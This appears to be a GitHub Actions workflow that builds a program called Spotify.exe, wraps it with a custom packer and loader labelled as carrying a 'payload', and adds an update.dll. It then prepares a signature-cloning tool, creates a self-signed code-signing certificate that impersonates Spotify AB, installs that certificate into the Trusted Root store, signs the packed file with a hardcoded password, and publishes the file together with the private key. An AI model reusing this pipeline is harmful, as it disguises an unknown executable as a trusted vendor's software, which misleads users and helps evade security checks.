name: Build Spotify - Costura + Protector
on:
  push:
    branches: [ main, master, develop ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: 🧾 Checkout código
        uses: actions/checkout@v4

      - name: ⚙️ Configurar .NET
        uses: actions/setup-dotnet@v3
        with:
          dotnet-version: '6.0.x'

      - name: ⚙️ Configurar Visual Studio
        uses: microsoft/setup-msbuild@v1.3

      - name: 📦 Instalar NuGet CLI
        run: choco install nuget.commandline -y

      - name: 🔧 Configurar FodyWeavers.xml
        shell: pwsh
        run: |
          Write-Host "🔧 Criando FodyWeavers.xml..."
        
          $xml = '<?xml version="1.0" encoding="utf-8"?>'
          $xml += '<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">'
          $xml += '  <Costura />'
          $xml += '</Weavers>'
        
          $xml | Out-File -FilePath "FodyWeavers.xml" -Encoding UTF8 -Force
          Write-Host "✅ FodyWeavers.xml configurado!"

      - name: 🗑️ Limpar bin/obj
        shell: pwsh
        run: |
          @("bin", "obj") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Recurse -Force $_ -ErrorAction SilentlyContinue }
          }

      - name: 🔄 Restaurar dependências solução
        shell: pwsh
        run: |
          nuget restore Spotify.sln -Verbosity detailed
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: 🔨 Compilar Release com Costura
        shell: pwsh
        run: |
          msbuild Spotify.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /verbosity:minimal /p:UseSharedCompilation=false
          if ($LASTEXITCODE -ne 0) { exit 1 }
          if (!(Test-Path "bin\Release\Spotify.exe")) { Write-Host "❌ Executável não gerado"; exit 1 }

      - name: 🔧 Compilar Update DLL (update.dll)
        shell: pwsh
        run: |
          if (!(Test-Path "Update\Update.csproj")) { Write-Host "❌ Update.csproj não encontrado"; exit 1 }
          msbuild Update\Update.csproj /p:Configuration=Release /m
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $dll = (Get-ChildItem "Update\bin\Release" -Recurse -Filter update.dll | Select-Object -First 1).FullName
          if (!$dll) { Write-Host "❌ update.dll não encontrado após build"; exit 1 }
          if (!(Test-Path "bin\Release")) { New-Item -ItemType Directory -Path "bin\Release" | Out-Null }
          Copy-Item $dll "bin\Release\update.dll" -Force

      - name: 🛡️ Compilar Protector (Mono.Cecil)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector\Protector.csproj")) { Write-Host "❌ Projeto Protector não encontrado"; exit 1 }
          dotnet restore Protector\Protector.csproj
          dotnet build Protector\Protector.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: 🛡️ Compilar Loader (Protector.Loader)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector.Loader\Protector.Loader.csproj")) { Write-Host "❌ Projeto Loader não encontrado"; exit 1 }
          dotnet restore Protector.Loader\Protector.Loader.csproj
          dotnet build Protector.Loader\Protector.Loader.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $global:loaderPath = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$global:loaderPath) { Write-Host "❌ Loader compilado não encontrado"; exit 1 }

      - name: 🛡️ Aplicar Protector (empacotar Loader + payload)
        shell: pwsh
        run: |
          $protExe = (Get-ChildItem "Protector\bin\Release" -Recurse -Filter Protector.exe | Select-Object -First 1).FullName
          if (!$protExe) { Write-Host "❌ Protector.exe não encontrado"; exit 1 }
          $input = "bin\Release\Spotify.exe"
          $outDir = "bin\Protected"
          if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
          $output = "$outDir\Spotify.exe"
          $loader = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$loader) { Write-Host "❌ Loader não encontrado"; exit 1 }
          & $protExe $input $output $loader
          if ($LASTEXITCODE -ne 0) { Write-Host "❌ Falha ao proteger"; exit 1 }

      - name: 🔍 Verificar resultado protegido
        shell: pwsh
        run: |
          $protected = "bin\Protected\Spotify.exe"
          if (!(Test-Path $protected)) { Write-Host "❌ Arquivo protegido não gerado"; exit 1 }
          $orig = (Get-Item "bin\Release\Spotify.exe").Length
          $prot = (Get-Item $protected).Length
          Write-Host "📊 Original: $([math]::Round($orig/1MB,2)) MB"
          Write-Host "🛡️ Protegido: $([math]::Round($prot/1MB,2)) MB"

      - name: 🐍 Configurar Python e SignatureClone
        shell: pwsh
        run: |
          Write-Host "🐍 Configurando Python e SignatureClone..."
          
          # Instalar Python se necessário
          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
            choco install python -y
            $env:Path += ";C:\Python*\Scripts;C:\Python*"
          }
          
          # Instalar dependências do SignatureClone
          pip install pefile cryptography
          
          # Verificar se SignatureClone está disponível
          if (!(Test-Path "SignatureClone-main\SignatureClone.py")) {
            Write-Host "❌ SignatureClone não encontrado"
            exit 1
          }
          
          Write-Host "✅ Python e dependências configuradas"

      - name: 🔐 Criar certificado autoassinado
        shell: pwsh
        run: |
          Write-Host "🔐 Criando certificado autoassinado para assinatura válida..."
          
          # Criar certificado autoassinado
          $certParams = @{
            Subject = "CN=Spotify AB, O=Spotify AB, L=Stockholm, C=SE"
            Type = "CodeSigningCert"
            CertStoreLocation = "Cert:\CurrentUser\My"
            KeyExportPolicy = "Exportable"
            KeySpec = "Signature"
            KeyLength = 2048
            KeyAlgorithm = "RSA"
            HashAlgorithm = "SHA256"
            NotAfter = (Get-Date).AddYears(10)
          }
          
          $cert = New-SelfSignedCertificate @certParams
          Write-Host "✅ Certificado criado: $($cert.Thumbprint)"
          
          # Exportar certificado para arquivo PFX (com senha)
          $pwd = ConvertTo-SecureString -String "SpotifySignature2024" -Force -AsPlainText
          $pfxPath = "SpotifyCodeSign.pfx"
          Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd
          Write-Host "✅ Certificado exportado: $pfxPath"
          
          # Exportar certificado público para instalação
          $cerPath = "SpotifyCodeSign.cer"
          Export-Certificate -Cert $cert -FilePath $cerPath
          Write-Host "✅ Certificado público exportado: $cerPath"
          
          # Instalar certificado na Trusted Root (para assinatura válida localmente)
          $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root","LocalMachine")
          $store.Open("ReadWrite")
          $store.Add($cert)
          $store.Close()
          Write-Host "✅ Certificado instalado em Trusted Root"

      - name: 🔏 Assinar executável com signtool.exe
        shell: pwsh
        run: |
          Write-Host "🔏 Assinando executável com signtool.exe..."
          
          # Localizar signtool.exe no Windows SDK
          $signtoolPaths = @(
            "${env:ProgramFiles(x86)}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles(x86)}\Windows Kits\10\App Certification Kit\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\App Certification Kit\signtool.exe"
          )
          
          $signtool = $null
          foreach ($path in $signtoolPaths) {
            $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) {
              $signtool = $found.FullName
              break
            }
          }
          
          if (!$signtool) {
            Write-Host "⚠️ signtool.exe não encontrado, instalando Windows SDK..."
            choco install windows-sdk-10.1 -y
            
            # Tentar localizar novamente
            foreach ($path in $signtoolPaths) {
              $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
              if ($found) {
                $signtool = $found.FullName
                break
              }
            }
            
            if (!$signtool) {
              Write-Host "❌ signtool.exe ainda não encontrado após instalação"
              exit 1
            }
          }
          
          Write-Host "✅ signtool.exe encontrado: $signtool"
          
          # Assinar o executável protegido
          $targetFile = "bin\Protected\Spotify.exe"
          $pfxPath = "SpotifyCodeSign.pfx"
          $pwd = "SpotifySignature2024"
          
          if (!(Test-Path $targetFile)) {
            Write-Host "❌ Arquivo alvo não encontrado: $targetFile"
            exit 1
          }
          
          # Comando de assinatura
          $signCmd = @(
            "sign",
            "/f", "`"$pfxPath`"",
            "/p", "`"$pwd`"",
            "/t", "http://timestamp.digicert.com",
            "/fd", "SHA256",
            "/v",
            "`"$targetFile`""
          )
          
          Write-Host "📝 Executando assinatura..."
          & $signtool @signCmd
          
          if ($LASTEXITCODE -eq 0) {
            Write-Host "✅ Executável assinado com sucesso!"
            
            # Verificar assinatura
            $cert = Get-AuthenticodeSignature $targetFile
            Write-Host "🔍 Status da assinatura: $($cert.Status)"
            Write-Host "🔍 Certificado: $($cert.SignerCertificate.Subject)"
            
            # Renomear para Spotify_Signed.exe
            $signedFile = "bin\Protected\Spotify_Signed.exe"
            Copy-Item $targetFile $signedFile -Force
            Write-Host "✅ Arquivo assinado copiado para: $signedFile"
            
            $finalSize = (Get-Item $signedFile).Length
            Write-Host "📊 Tamanho final: $([math]::Round($finalSize/1MB,2)) MB"
          } else {
            Write-Host "❌ Falha ao assinar executável"
            exit 1
          }

      - name: 🧪 Teste de execução
        shell: pwsh
        run: |
          function Test-Exe { param([string]$Path,[string]$Label)
            Write-Host "📋 $Label"
            $testDir = "test_$([guid]::NewGuid().ToString('N').Substring(0,8))"
            try {
              New-Item -ItemType Directory -Path $testDir | Out-Null
              Copy-Item $Path "$testDir\Spotify.exe"
              $p = Start-Process -FilePath "$testDir\Spotify.exe" -PassThru -WindowStyle Hidden -ErrorAction Stop
              Start-Sleep -Seconds 2
              if ($p -and !$p.HasExited) { Write-Host "✅ OK (PID $($p.Id))"; $p.Kill(); return $true } else { return $false }
            } catch { Write-Host "❌ Erro: $($_.Exception.Message)"; return $false } finally { if (Test-Path $testDir) { Remove-Item -Recurse -Force $testDir -ErrorAction SilentlyContinue } }
          }
          
          function Test-Certificate { param([string]$Path)
            try {
              $cert = Get-AuthenticodeSignature $Path
              if ($cert.Status -eq "Valid") {
                Write-Host "✅ Certificado válido: $($cert.SignerCertificate.Subject)"
                return $true
              } elseif ($cert.Status -eq "NotSigned") {
                Write-Host "⚠️ Arquivo não assinado"
                return $false
              } else {
                Write-Host "⚠️ Certificado presente mas inválido: $($cert.Status)"
                return $true  # Certificado presente mas inválido (esperado com clone)
              }
            } catch {
              Write-Host "❌ Erro ao verificar certificado: $($_.Exception.Message)"
              return $false
            }
          }
          
          $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
          $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
          
          # Verificar certificado no arquivo final
          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
            Test-Certificate "bin\Protected\Spotify_Signed.exe"
          }
          
          if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }

      - name: 📁 Upload Arquivos Finais
        uses: actions/upload-artifact@v4
        with:
          name: spotify-final
          path: |
            bin/Protected/Spotify_Signed.exe
            bin/Release/update.dll
            SpotifyCodeSign.cer
            SpotifyCodeSign.pfx
          retention-days: 90
        if: always()
